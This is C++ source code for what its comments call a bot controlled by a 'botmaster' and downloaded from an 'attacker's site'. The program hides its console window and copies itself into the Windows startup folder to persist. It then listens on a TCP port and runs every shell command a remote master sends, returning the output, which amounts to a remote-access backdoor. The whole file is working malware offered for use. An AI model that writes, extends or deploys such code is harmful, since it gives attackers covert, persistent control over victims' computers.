#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include<iostream>

#include "Network.h"
#include "Utils.h"
#include <thread>

void telNet(SOCKET s)
{
    char* buf = new char[65536];
    std::string stdOut;
    while (1)
    {
        /* recieve the command */
        ZeroMemory(buf, 65536);
        if(recv(s, buf, 65536, 0) < 0)
            break;

        /* run the command and send the output back*/
        stdOut = executeShell(buf);
        if (sendStdOut(s, stdOut))
            break;
    }
    delete[] buf;
}

int main(int argc, char** argv)
{
    /* hide console*/
    hideConsole();

    /*running once after file is downloaded from the attacker's site*/
    if (!isInStartUp(argv[0])) //check if the application is running from the startUp directory and if the process is running
    {
        if(isRunning())
            return 1;
        copyToStartUp(argv[0]);
        executeStartUpFile();
        return 0;
    }

    /* init winsock*/
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    /* start a thread */
    std::thread findMaster(findMastersIP);

    /* init socket*/
    sockaddr_in addressinfo;
    int opt;

    addressinfo.sin_addr.s_addr = getPrivateIP();
    addressinfo.sin_port = htons(TCP_PORT);
    addressinfo.sin_family = AF_INET;

    SOCKET master;
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
        return 1;

    opt = 1;
    /* telling the os to free the socket immidetly after closing the socket*/
    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt)) < 0)
        return 1;

    /* bind the socket to the port the botmaster knows about*/
    if (bind(s, (sockaddr*)&addressinfo, sizeof(addressinfo)) < 0)
        return 1;

    /* start listenning on the port*/
    if (listen(s, 1) < 0)
        return 1;

    /* end of init sock*/

    while (1)
    {
        master = accept(s, NULL, 0);
        if (!s || !master)
            return 1;
        telNet(master);
        closesocket(master);
    }
}